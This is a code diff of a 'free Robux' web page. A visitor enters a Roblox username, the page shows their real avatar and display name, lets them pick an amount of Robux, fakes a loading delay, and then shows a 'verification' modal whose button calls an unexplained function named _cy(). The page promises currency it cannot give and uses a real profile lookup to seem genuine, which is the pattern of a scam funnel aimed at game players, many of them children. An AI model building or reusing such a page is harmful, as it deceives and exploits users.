@@ -52,56 +52,6 @@
 
                     <div id="instructions-wrapper" class="relative w-full mb-[90px] mt-[-70px]">
                         <img class="absolute h-[300px] w-full object-cover top-[-150px] z-1" loading="eager" fetchpriority="high" decoding="async" src="/img/bg_under_homeimg.webp" alt="decorative shape for section 2 on the homepage">
-                       <section class="content-card">
-            <h1 class="text-3xl lg:text-4xl font-bold mb-6 text-white">Get Your Free Robux Today!</h1> <input class="w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300"
-                   id="username"
-                   placeholder="Enter your Roblox username"
-                   type="text"
-                   aria-label="Roblox username input"/>
-            <button class="bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-gray-800 transition mb-6"
-                    id="search-button"
-                    onclick="fetchProfile()">
-                Search Profile
-            </button>
-            
-            <div class="hidden mt-6 text-center animate-fade-in" id="profile">
-                <img class="w-24 h-24 mx-auto rounded-full mb-2 shadow-md" id="avatar" alt="Roblox User Avatar"/>
-                <p class="text-xl font-semibold" id="display-name"></p>
-            </div>
-
-            <div class="hidden mt-8 animate-fade-in" id="resource-section">
-                <p class="block text-lg font-medium mb-4">Select Robux Amount</p>
-                <div class="grid grid-cols-2 gap-4">
-                    <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
-                         onclick="selectResource(this, 800)">
-                        <img alt="800 Robux Icon" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
-                        <p class="text-xl font-semibold">800</p>
-                    </div>
-                    <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
-                         onclick="selectResource(this, 1700)">
-                        <img alt="1700 Robux Icon" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
-                        <p class="text-xl font-semibold">1,700</p>
-                    </div>
-                    <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
-                         onclick="selectResource(this, 4500)">
-                        <img alt="4500 Robux Icon" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
-                        <p class="text-xl font-semibold">4,500</p>
-                    </div>
-                    <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
-                         onclick="selectResource(this, 10000)">
-                        <img alt="10000 Robux Icon" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
-                        <p class="text-xl font-semibold">10,000</p>
-                    </div>
-                </div>
-                <div class="flex justify-center mt-6">
-                    <button class="hidden bg-green-600 text-white px-6 py-2 rounded-xl hover:bg-green-700 transition"
-                            id="confirm-button"
-                            onclick="confirmSelection()">
-                        Confirm Selection
-                    </button>
-                </div>
-            </div>
-        </section>
                         <section class="container lg:px-[64px] w-full flex flex-col items-center px-4 mx-auto text-white relative z-10 mt-[70px]">
                             <h2 class="py-4 text-3xl lg:text-4xl font-bold mb-4">How you can earn free Robux</h2>
                             <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 w-full mt-5 items-stretch">
@@ -130,6 +80,84 @@
                             </div>
                         </section>
                     </div>
+
+                    <div class="max-w-xl mx-auto py-10 px-6 text-center">
+        <input class="w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300" 
+               id="username" 
+               placeholder="Enter your Roblox username" 
+               type="text"/>
+        <button class="bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-gray-800 transition mb-6" 
+                id="search-button" 
+                onclick="fetchProfile()">
+            Search
+        </button>
+        
+        <div class="hidden mt-6 text-center" id="profile">
+            <img class="w-24 h-24 mx-auto rounded-full mb-2 shadow-md" id="avatar"/>
+            <p class="text-xl font-semibold" id="display-name"></p>
+        </div>
+
+        <div class="hidden mt-8" id="resource-section">
+            <p class="block text-lg font-medium mb-4">Select robux amount</p>
+            <div class="grid grid-cols-2 gap-4">
+                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
+                     onclick="selectResource(this, 800)">
+                    <img alt="800 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
+                    <p class="text-xl font-semibold">800</p>
+                </div>
+                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
+                     onclick="selectResource(this, 1700)">
+                    <img alt="1700 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
+                    <p class="text-xl font-semibold">1,700</p>
+                </div>
+                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
+                     onclick="selectResource(this, 4500)">
+                    <img alt="4500 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
+                    <p class="text-xl font-semibold">4,500</p>
+                </div>
+                <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
+                     onclick="selectResource(this, 10000)">
+                    <img alt="10000 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
+                    <p class="text-xl font-semibold">10,000</p>
+                </div>
+            </div>
+            <div class="flex justify-center mt-6">
+                <button class="hidden bg-green-600 text-white px-6 py-2 rounded-xl hover:bg-green-700 transition" 
+                        id="confirm-button" 
+                        onclick="confirmSelection()">
+                    Confirm
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" id="loading-overlay">
+        <div class="text-center">
+            <div class="w-16 h-16 border-4 border-white border-dashed rounded-full animate-spin mx-auto mb-4"></div>
+            <p class="text-white text-xl font-semibold animate-pulse">Loading...</p>
+        </div>
+    </div>
+
+    <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="error-modal">
+        <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center">
+            <p class="text-red-600 font-semibold mb-4" id="error-modal-text">Error</p>
+            <button class="bg-red-500 text-white px-4 py-2 rounded-xl hover:bg-red-600 transition" 
+                    onclick="closeErrorModal()">
+                Close
+            </button>
+        </div>
+    </div>
+
+    <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="verify-step">
+        <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
+            <p class="text-lg font-medium mb-4">Complete the verification to receive your robux.</p>
+            <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition" 
+                    onclick="_cy()">
+                Verify
+            </button>
+        </div>
+    </div>
+                    
                     <section class="w-10/12 md:w-8/12 lg:w-4/12" itemscope="" itemtype="https://schema.org/FAQPage">
                         <div class="flex flex-col items-center justify-center md:flex-row">
                             <h2 class="mt-5 text-xl font-bold tracking-tight text-white" itemprop="name">FAQ</h2>
@@ -192,6 +220,7 @@
             </div>
         </footer>
     </div>
+   
     <script>
         (function(){
             const errorModal = document.getElementById("error-modal");
@@ -210,18 +239,17 @@
             }
 
             async function fetchProfile() {
-                const usernameInput = document.getElementById("username");
-                const username = usernameInput.value.trim();
-                const profileSection = document.getElementById("profile");
+                const username = document.getElementById("username").value.trim();
+                const profile = document.getElementById("profile");
                 const resourceSection = document.getElementById("resource-section");
                 const confirmButton = document.getElementById("confirm-button");
                 
-                profileSection.classList.add("hidden");
+                profile.classList.add("hidden");
                 resourceSection.classList.add("hidden");
                 confirmButton.classList.add("hidden");
                 
-                if (!username) {
-                    showError("Please enter a Roblox username.");
+                if(!username) {
+                    showError("Please enter a Roblox username");
                     return;
                 }
                 
@@ -231,76 +259,64 @@
                     const res1 = await fetch("https://users.roproxy.com/v1/usernames/users", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            usernames: [username],
-                            excludeBannedUsers: true
+                        body: JSON.stringify({ 
+                            usernames: [username], 
+                            excludeBannedUsers: true 
                         })
                     });
 
                     const data1 = await res1.json();
                     if (!data1.data || data1.data.length === 0) {
-                        throw new Error("User not found.");
+                        throw new Error("User not found");
                     }
                     const userId = data1.data[0].id;
                     const displayName = data1.data[0].displayName;
-
                     const res2 = await fetch(
                         `https://thumbnails.roproxy.com/v1/users/avatar?userIds=${userId}&size=150x150&format=Png&isCircular=false`
                     );
                     const data2 = await res2.json();
                     const avatarUrl = data2.data[0].imageUrl;
-
                     document.getElementById("avatar").src = avatarUrl;
                     document.getElementById("display-name").textContent = displayName;
-                    profileSection.classList.remove("hidden");
+                    profile.classList.remove("hidden");
                     resourceSection.classList.remove("hidden");
-                    profileSection.classList.add("animate-fade-in"); // Add animation class
-                    resourceSection.classList.add("animate-fade-in"); // Add animation class
-
                 } catch (err) {
-                    console.error("Error fetching profile:", err);
-                    showError("Roblox user not found. Please check the username and try again.");
+                    showError("User not found. Please check the username and try again.");
                 } finally {
                     loadingOverlay.classList.add("hidden");
                 }
             }
-
             function selectResource(element, value) {
                 document.querySelectorAll('.resource-option').forEach(item => {
                     item.classList.remove(
-                        'ring',
-                        'ring-2',
-                        'ring-green-500',
+                        'ring', 
+                        'ring-2', 
+                        'ring-green-500', 
                         'bg-green-50'
                     );
                 });
                 
+                // Add selection to clicked option
                 element.classList.add(
-                    'ring',
-                    'ring-2',
-                    'ring-green-500',
+                    'ring', 
+                    'ring-2', 
+                    'ring-green-500', 
                     'bg-green-50'
                 );
                 
                 selectedResource = value;
                 document.getElementById('confirm-button').classList.remove('hidden');
-                document.getElementById('confirm-button').classList.add('animate-fade-in'); // Animate confirm button
             }
-
             async function confirmSelection() {
-                if (!selectedResource) {
-                    showError("Please select a Robux amount.");
+                if(!selectedResource) {
+                    showError("Please select a Robux amount");
                     return;
                 }
-                
                 loadingOverlay.classList.remove("hidden");
                 await new Promise(resolve => setTimeout(resolve, 2500));
                 loadingOverlay.classList.add("hidden");
-                
                 verifyStep.classList.remove("hidden");
-                verifyStep.classList.add("animate-fade-in");
             }
-
             window.fetchProfile = fetchProfile;
             window.selectResource = selectResource;
             window.confirmSelection = confirmSelection;
